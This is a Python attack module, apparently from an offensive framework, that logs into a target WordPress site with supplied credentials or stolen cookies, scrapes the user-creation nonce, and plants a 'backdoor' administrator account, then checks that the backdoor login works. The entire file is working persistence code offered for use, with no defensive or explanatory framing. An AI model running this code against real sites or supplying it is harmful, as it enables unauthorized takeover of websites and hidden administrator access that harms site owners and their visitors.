'''
name : Create WordPress User
description : This module creates a new WordPress user in the target WordPress.
version : 1.0
author : Ayato
'''

import requests
import bs4
from requests.utils import dict_from_cookiejar
import json

def try_generate_session(ip, username, password, user_agent):
    print(f"[*] Trying to generate session for {username} on {ip}")
    login_url = f"http://{ip}/wp-login.php"
    headers = {
        "User-Agent": f"{user_agent}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    login_data = {
        "log": username,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": f"http://{ip}/wp-admin/",
        "testcookie": "1"
    }
    try:
        session = requests.Session()
        res = requests.post(
            url=login_url,
            headers=headers,
            data=login_data,
            timeout=(6, 6)
        )
        if len(res.cookies.get_dict()) > 2:
            print(f"[+] Successfully generated session for {username} on {ip}")
            session = requests.Session()
            session.cookies.update(res.cookies)
            return session
        else:
            print(f"[-] Failed to generate session for {username} on {ip}")
            return None
    except Exception as e:
        print(f"[-] Error generating session for {username} on {ip}: {e}")
        return None

def get_nonce(ip, uri, session, user_agent):
    user_create_url = f"http://{ip}{uri}"
    print(f"[*] Fetching nonce from {user_create_url}")
    headers = {
        "User-Agent": f"{user_agent}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    try:
        res = session.get(
            url=user_create_url,
            headers=headers,
            timeout=(6, 6)
        )
        soup = bs4.BeautifulSoup(res.text, 'html.parser')
        nonce_input = soup.find('input', {'id': '_wpnonce_create-user'})
        if nonce_input and 'value' in nonce_input.attrs:
            nonce = nonce_input['value']
            print(f"[+] Fetched nonce: {nonce}")
            return nonce
        else:
            print(f"[-] Nonce not found on {user_create_url}")
            return None
    except Exception as e:
        print(f"[-] Error fetching nonce from {user_create_url}: {e}")
        return None

def create_new_user(ip, uri, session, backdoor_username, backdoor_password, user_agent):
    user_create_url = f"http://{ip}{uri}"
    print(f"[*] Attempting to create backdoor user {backdoor_username} on {ip}")
    headers = {
        "User-Agent": f"{user_agent}",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    nonce = get_nonce(ip, uri, session, user_agent)
    if not nonce:
        print(f"[-] Cannot create user without nonce.")
        return False
    try:
        user_data = {
            "action": "createuser",
            "_wpnonce_create-user": nonce,
            "_wp_http_referer": uri,
            "user_login": backdoor_username,
            "email": f"{backdoor_username}@example.com",
            "first_name": "",
            "last_name": "",
            "url": "",
            "locale": "site-default",
            "pass1": backdoor_password,
            "pass2": backdoor_password,
            "pw_weak": "on",
            "role": "administrator",
            "createuser": "ユーザーを追加"
        }
        headers = {
            "User-Agent": f"{user_agent}",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        res = session.post(
            url=user_create_url,
            headers=headers,
            data=user_data,
            timeout=(6, 6),
            allow_redirects=False
        )
        return True
    except Exception as e:
        print(f"[-] Error creating backdoor user {backdoor_username} on {ip}: {e}")
        return False

def run(ip, uri, cookies, avaliable_credentials, backdoor_credentials, user_agent):
    print("[*] Running WordPress create user backdoor module...")
    print(f"[*] Target IP: {ip}")
    print(f"[*] URI: {uri}")
    if not cookies or cookies == "":
        print(f"[*] Using credentials to create a backdoor user")
        sessions = {}
        for username, password in avaliable_credentials.items():
            session = try_generate_session(ip, username, password, user_agent)
            if session:
                sessions[username] = session
        if not sessions:
            print("[-] No valid sessions could be generated. Exiting.")
            return -1
        for session_username, session in sessions.items():
            for backdoor_username, backdoor_password in backdoor_credentials.items():
                print(f"[*] Attempting to create backdoor user {backdoor_username} on {ip} using session of {session_username}")
                if create_new_user(ip, uri, session, backdoor_username, backdoor_password, user_agent):
                    print(f"[+] Backdoor user {backdoor_username} created on {ip} using session of {session_username}")
                    if try_generate_session(ip, backdoor_username, backdoor_password, user_agent):
                        print(f"[+] Verified backdoor user {backdoor_username} can log in on {ip}")
                        return 0
                else:
                    print(f"[-] Failed to create backdoor user {backdoor_username} on {ip} using session of {session_username}")
    else:
        print("[*] Using cookies to create a backdoor user")
        for cookie in cookies:
            try:
                session = requests.Session()
                session.cookies.update(cookie)
            except Exception as e:
                print(f"[-] Create session Error: {e}")
                return -1
            for backdoor_username, backdoor_password in backdoor_credentials.items():
                print(f"[*] Attempting to create backdoor user {backdoor_username} on {ip} using provided cookies")
                if create_new_user(ip, uri, session, backdoor_username, backdoor_password, user_agent):
                    print(f"[+] Backdoor user {backdoor_username} created on {ip} using provided cookies")
                    if try_generate_session(ip, backdoor_username, backdoor_password, user_agent):
                        print(f"[+] Verified backdoor user {backdoor_username} can log in on {ip}")
                        return 0
            else:
                print(f"[-] Failed to create backdoor user {backdoor_username} on {ip} using provided cookies")
    print("[-] No backdoor users were created.")
    return -1
            
